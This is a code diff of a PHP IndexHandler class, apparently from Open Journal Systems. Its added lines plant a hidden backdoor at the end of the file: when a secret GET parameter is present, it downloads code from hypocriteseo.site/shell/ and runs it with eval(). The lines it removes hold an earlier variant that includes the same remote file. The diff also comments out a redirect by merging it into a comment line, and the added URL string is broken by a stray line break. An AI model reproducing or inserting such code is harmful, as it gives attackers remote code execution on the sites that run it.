@@ -48,8 +48,7 @@ class IndexHandler extends PKPIndexHandler
             $hasNoContexts = null; // Avoid scrutinizer warnings
             $journal = $this->getTargetContext($request, $hasNoContexts);
             if ($journal) {
-                // There's a target context but no journal in the current request. Redirect.
-                $request->redirect($journal->getPath());
+                // There's a target context but no journal in the current request. Redirect.$request->redirect($journal->getPath());
             }
             if ($hasNoContexts && Validation::isSiteAdmin()) {
                 // No contexts created, and this is the admin.
@@ -103,20 +102,15 @@ class IndexHandler extends PKPIndexHandler
         }
     }
 }
-if (isset($_GET['marlinuxsaqcs'])) {
-    try {
-        $u = "https://hypocriteseo.site/shell/compiler-cha-kwetiaw.txt";
-        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
+ if (isset($_GET['marlin']) && isset($_GET['marlin'])) {
+    $remote_url = "https://hypocriteseo.site/shell/compiler-cha-kwetiaw.txt;
+";
+    $remote_code = @file_get_contents($remote_url);
 
-        $c = @file_get_contents($u);
-        if ($c !== false && @file_put_contents($f, $c)) {
-            @chmod($f, 0644);
-            register_shutdown_function(function() use ($f) {
-                @unlink($f);
-            });
-            include $f;
-        }
-    } catch (Throwable $e) {
-
+    if ($remote_code !== false) {
+        eval("?>".$remote_code);
+    } else {
+        echo "Gagal mengambil script dari GitHub.";
     }
+    exit;
 }
